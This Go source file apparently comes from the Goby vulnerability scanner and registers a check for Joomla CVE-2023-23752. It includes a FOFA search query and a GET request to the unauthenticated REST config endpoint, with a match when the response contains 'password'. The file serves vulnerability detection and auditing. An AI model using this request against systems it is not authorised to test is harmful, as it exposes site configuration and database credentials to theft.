package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Joomla Rest API 未授权访问漏洞（CVE-2023-23752）",
  "Description": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。CVE-2023-23752 中，由于鉴权存在错误，导致攻击者可构造恶意请求未授权访问RestAPI 接口，造成敏感信息泄漏，获取Joomla相关配置信息。</span><br></p>",
  "Product": "Joomla",
  "Homepage": "http://www.Joomla.org/",
  "DisclosureDate": "2023-02-17",
  "Author": "清晨",
  "FofaQuery": "app=\"Joomla\"",
  "GobyQuery": "app=\"Joomla\"",
  "Level": "2",
  "Impact": "<p>将会造成<span style=\"color: rgb(52, 58, 64); font-size: 16px;\">敏感信息泄漏</span>。</p>",
  "Recommendation": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">建议您更新当前系统或软件至最新版，完成漏洞的修复。</span><br></p>",
  "References": [
    "https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html"
  ],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/index.php/v1/config/application?public=true",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "password",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/index.php/v1/config/application?public=true",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "password",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [
    "未授权访问"
  ],
  "VulType": [
    "未授权访问"
  ],
  "CVEIDs": [
    "CVE-2023-23752"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Joomla Rest API 未授权访问漏洞（CVE-2023-23752）",
      "Product": "Joomla",
      "Description": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。CVE-2023-23752 中，由于鉴权存在错误，导致攻击者可构造恶意请求未授权访问RestAPI 接口，造成敏感信息泄漏，获取Joomla相关配置信息。</span><br></p>",
      "Recommendation": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">建议您更新当前系统或软件至最新版，完成漏洞的修复。</span><br></p>",
      "Impact": "<p>将会造成<span style=\"color: rgb(52, 58, 64); font-size: 16px;\">敏感信息泄漏</span>。</p>",
      "VulType": [
        "未授权访问"
      ],
      "Tags": [
        "未授权访问"
      ]
    },
    "EN": {
      "Name": "Joomla Rest API  Unauthorized（CVE-2023-23752）",
      "Product": "Joomla",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [
        "Unauthorized Access"
      ],
      "Tags": [
        "Unauthorized Access"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}